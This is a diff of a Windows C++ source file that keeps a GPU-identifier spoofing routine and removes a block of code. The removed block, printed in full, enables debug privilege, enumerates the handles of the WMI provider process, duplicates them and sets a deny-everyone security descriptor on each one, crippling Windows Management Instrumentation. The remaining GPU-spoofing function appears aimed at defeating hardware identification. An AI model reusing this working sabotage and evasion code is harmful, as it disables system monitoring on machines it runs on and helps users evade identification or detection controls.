@@ -6,33 +6,9 @@
 #include <tlhelp32.h>
 #include <aclapi.h>
 #include <sddl.h>
-#include <winternl.h>
 #include <algorithm>
 
 #pragma comment(lib, "advapi32.lib")
-
-// NT internal definitions for handle enumeration
-typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
-    USHORT UniqueProcessId;
-    USHORT CreatorBackTraceIndex;
-    UCHAR ObjectTypeIndex;
-    UCHAR HandleAttributes;
-    USHORT HandleValue;
-    PVOID Object;
-    ULONG GrantedAccess;
-} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
-
-typedef struct _SYSTEM_HANDLE_INFORMATION {
-    ULONG NumberOfHandles;
-    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
-} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
-
-typedef NTSTATUS (NTAPI *tNtQuerySystemInformation)(
-    ULONG SystemInformationClass,
-    PVOID SystemInformation,
-    ULONG SystemInformationLength,
-    PULONG ReturnLength
-);
 
 std::string GetRegistryString(HKEY hKeyRoot, const char* subKey, const char* valueName) {
     HKEY hKey;
@@ -186,89 +162,6 @@ bool IdentifyAndSpoofGPU(const char* host_real_uuid) {
         outfile << real_uuid;
         outfile.close();
     }
-    return true;
-}
-
-bool SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
-    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) { CloseHandle(hToken); return FALSE; }
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) { CloseHandle(hToken); return FALSE; }
-    CloseHandle(hToken);
-    return TRUE;
-}
-
-bool DisruptWMI() {
-    if (!SetPrivilege(SE_DEBUG_NAME, TRUE)) return false;
-
-    tNtQuerySystemInformation pNtQuerySystemInformation = (tNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
-    if (!pNtQuerySystemInformation) return false;
-
-    HKEY hKey;
-    DWORD wmiPid = 0;
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Wbem\\Transports\\Decoupled\\Server", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        DWORD dwSize = sizeof(DWORD);
-        RegQueryValueExA(hKey, "ProcessIdentifier", NULL, NULL, (LPBYTE)&wmiPid, &dwSize);
-        RegCloseKey(hKey);
-    }
-
-    if (wmiPid == 0) {
-        PROCESSENTRY32 entry;
-        entry.dwSize = sizeof(PROCESSENTRY32);
-        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-        if (Process32First(snapshot, &entry)) {
-            do {
-                if (_wcsicmp(entry.szExeFile, L"wmiprvse.exe") == 0) {
-                    wmiPid = entry.th32ProcessID;
-                    break;
-                }
-            } while (Process32Next(snapshot, &entry));
-        }
-        CloseHandle(snapshot);
-    }
-
-    if (wmiPid == 0) return false;
-
-    HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, wmiPid);
-    if (!hProcess) return false;
-
-    ULONG handleInfoSize = 0x10000;
-    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
-    if (!handleInfo) { CloseHandle(hProcess); return false; }
-
-    while (pNtQuerySystemInformation(16 /* SystemHandleInformation */, handleInfo, handleInfoSize, NULL) == 0xC0000004) {
-        handleInfoSize *= 2;
-        PSYSTEM_HANDLE_INFORMATION newHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize);
-        if (!newHandleInfo) { free(handleInfo); CloseHandle(hProcess); return false; }
-        handleInfo = newHandleInfo;
-    }
-
-    const char* sddl = "D:(D;;GA;;;WD)";
-    PSECURITY_DESCRIPTOR sd = NULL;
-    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(sddl, SDDL_REVISION_1, &sd, NULL)) {
-        free(handleInfo);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
-        if (handleInfo->Handles[i].UniqueProcessId == wmiPid) {
-            HANDLE hDup = NULL;
-            if (DuplicateHandle(hProcess, (HANDLE)handleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
-                SetKernelObjectSecurity(hDup, DACL_SECURITY_INFORMATION, sd);
-                CloseHandle(hDup);
-            }
-        }
-    }
-
-    free(handleInfo);
-    LocalFree(sd);
-    CloseHandle(hProcess);
     return true;
 }
 
